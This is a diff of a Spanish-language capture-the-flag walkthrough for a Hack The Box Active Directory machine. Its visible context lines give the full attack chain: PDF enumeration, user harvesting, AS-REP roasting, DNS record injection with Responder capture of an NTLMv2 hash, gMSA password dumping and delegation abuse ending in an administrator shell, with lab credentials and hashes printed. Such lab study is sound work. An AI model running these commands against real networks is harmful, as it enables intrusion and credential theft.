@@ -101,13 +101,13 @@ En la url vemos un formato de yy/mm/dd si cambiamos los datos nos muestra mas ar
 
 ````bash
 >http://10.10.10.248/documents/2022-01-02-upload.pdf
-`````
+````
 
 Si por ejemplo cambiamos el 02 por 01 nos da otro .pdf
 
 ````bash
 >http://10.10.10.248/documents/2022-01-01-upload.pdf
-`````
+````
 
 Esto es interesante por que puede que en algun pdf obtengamos alguna credencial valida, pero no sabemos cuantas fechas existen en esta ruta `Documents` asi que en este punto puedo ir uno por uno pero podria perder mucho tiempo y no encontrar nada al final, con `bash` podemos hacer algun truco para enumerar todas las rutas que existen. 
 
@@ -116,7 +116,7 @@ Vamos hacer un script que nos permita buscar de manera mas rapida todas las ruta
 
 ````bash
 for i in {2020..2022}; do for j in {01..12}; do for k in {01..31}; do echo "http://10.10.10.248/documents/$i-$j-$k-upload.pdf"; done; done; done | xargs -n 1 wget
-`````
+````
 
 Este script nos permite descargar con wget en un rango de 2020 a 2022 , mes 01 a mes 12, dia 01 a dia 31
 
@@ -132,13 +132,11 @@ Ahora con todos los archivos lo primero que hacemos es mirar los metadatos usand
 
 ![imagen-de-prueba](/assets/img/intelligence/exiftool1.png)
 
-
-
 Tenemos muchos usuarios, vamos a crear un archivo users.
 
 ````bash
 > exiftool *.pdf | grep 'Creator' | awk 'NF{print $NF}' | sort -u > users
-`````
+````
 
 ![imagen-de-prueba](/assets/img/intelligence/exiftool2.png)
 
@@ -147,7 +145,7 @@ Bien ya tenemos los usuario, ahora tenemos que verificar que son existentes usar
 
 ````bash
 kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users #users es donde guardamos la lista de usuarios
-`````
+````
 
 ![imagen-de-prueba](/assets/img/intelligence/kerbrute.png)
 
@@ -156,7 +154,7 @@ Perfecto tenemos 30 usuarios validos que existen en el DC, ahora lo que podemos 
 
  ````bash
  impacket-GetNPUsers.py intellingence.htb/ -no-pass -userfile users
-`````
+````
 
 ![imagen-de-prueba](/assets/img/intelligence/asrep.png)
 
@@ -167,7 +165,7 @@ Todos los PDF que descargamos tiene contenido puede que en alguno exista alguna 
 
 ````bash
 >for file in $(ls); do echo $file; done | while read filename; do pdftotext $filename; done 
-`````
+````
 
 ![imagen-de-prueba](/assets/img/intelligence/pdftotext.png)
 
@@ -176,7 +174,7 @@ Tenemos el texto de todos los pdf ahora con `cat` podemos mirar el contenido , p
 
 ````bash
 >cat *.txt | grep 'password' -2
-`````
+````
 
 ![imagen-de-prueba](/assets/img/intelligence/password1.png)
 
@@ -197,7 +195,7 @@ El usuario no es vulnerable al `Kerberoasting` , lo que puedo hacer ahora que te
 
 ````bash
 >cme smb 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --shares
-`````
+````
 
 ![imagen-de-prueba](/assets/img/intelligence/cme1.png)
 
@@ -206,7 +204,7 @@ Tenemos acceso a recursos compartidos con el usuario `Tiffany` , vemos que hay u
 
 ````bash
 >smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -R 'IT'
-`````
+````
 
 + El modificador R es para listar todo el contenido del recurso IT.
 
@@ -217,7 +215,7 @@ Descargamos el archivo .ps1
 
 ````bash 
 >smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --download 'IT/downdetector.ps1'
-`````
+````
 
 Le hacemos un `cat` al .ps1 para ver su contenido.
 
@@ -237,7 +235,7 @@ Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Grave
 }
 } catch {}
 }
-`````
+````
 
 Analizando el script vemos que  `$record` esta llamdo a los DNS records que existen pero se queda con los que tenga la palabra `web`  `Where-Object Name -like "web*"` , mas abajo se esta haciendo una peticion a la url `"http://$($record.Name)"` que con `.Name`  verifica si esxite la palabra `web` en la url, lo mas importante es que con `-UseDefaultCredentials` el script se autentica con las credenciales por defecto de alguien.
 
@@ -248,7 +246,7 @@ Para esto necesitamos una herramienta `dnstool.py` con la que vamos hacer la  in
 
 ````bash
 >python3 dnstool.py -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webtest -a add -t A -d 10.10.14.16 10.10.10.248
-`````
+````
 
 + -r : nombre del dns 
 + -a : accion en este caso add para agregar 
@@ -259,7 +257,7 @@ Ahora con `responder` nos ponemos en escucha en la interfaz `Tun0`
 
 ````bash
 >reponder I tun0
-`````
+````
 
 ![imagen-de-prueba](/assets/img/intelligence/responder1.png)
 
@@ -270,7 +268,7 @@ El script dice que se ejecuta cada 5 minutos asi que esperemos y veamos si algui
 [HTTP] NTLMv2 Client   : 10.10.10.248
 [HTTP] NTLMv2 Username : intelligence\Ted.Graves
 [HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:795ed731100fa3bf:EC36E05D2F850C3191B90CE10EFBD308:0101000000000000C9381448F792D7018BC129454A682E4000000000020008004B0054005000330001001E00570049004E002D0046005500450036004F00300059003800440049003200040014004B005400500033002E004C004F00430041004C0003003400570049004E002D0046005500450036004F003000590038004400490032002E004B005400500033002E004C004F00430041004C00050014004B005400500033002E004C004F00430041004C000800300030000000000000000000000000200000579BF3BE75B46EDA9826B9B1C8B2518795D25E61038C5C91F8A10A3DFB9AC4B70A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D0030007800640066002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
-`````
+````
 
 El responder no da un hashs NTLMv2 de un usuario `Ted.Graves` , ahora tenemos que intentar romper el hashs y ver la contraseña en texto plano
 
@@ -288,7 +286,7 @@ Iniciamos la busqueda de informacion con `Bloodhound-python` usando las credenci
 
 ````bash
 >bloodhound-python -c ALL -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb
-`````
+````
 
 ![imagen-de-prueba](/assets/img/intelligence/bloodhoundpy.png)
 
@@ -310,7 +308,7 @@ Para dumpear la GMSA password usamos `gMSADumper.py` la cual solo nos pide el us
 
 ````bash
 >python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -l 10.10.10.248 -d intelligence.htb 
-`````
+````
 
 ![imagen-de-prueba](/assets/img/intelligence/gmsadumper1.png)
 
@@ -319,7 +317,7 @@ Tenemos el hashs del `service account` con esto lo que podemos hacer es imperson
 
 ````bash
 >mpacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :4b18bc2b883607c026d27bf526bcb3d4
-`````
+````
 
 ![imagen-de-prueba](/assets/img/intelligence/getst1.png)
 
@@ -328,13 +326,13 @@ Tenemos un error `clock skew too great` esto pasa por que nuestra maquina tiene 
 
 ````bash
 >ntpdate 10.10.10.248
-`````
+````
 
 Si utilizamos `virtual-box` seguiremos teniendo el mismo error al ejecutar `getST` para solucionarlo hay que desactivar las virtual-box-utils.
 
 ````bash
 >sudo service virtualbox-guest-utils stop
-`````
+````
 
 Ejecutamos de nuevo `mpacket-getST`
 
@@ -345,13 +343,13 @@ Creamos el Administrator.cache ahora tenemos que exportarlo.
 
 ````bash
 export KRB5CCNAME=Administrator.ccache
-`````
+````
 
 Vamos a usar `wmiexec.py` 
 
 ````bash
 >impacket-wmiexec dc.intelligence.htb -k -no-pass
-`````
+````
 
 ![imagen-de-prueba](/assets/img/intelligence/adminshell.png)
 
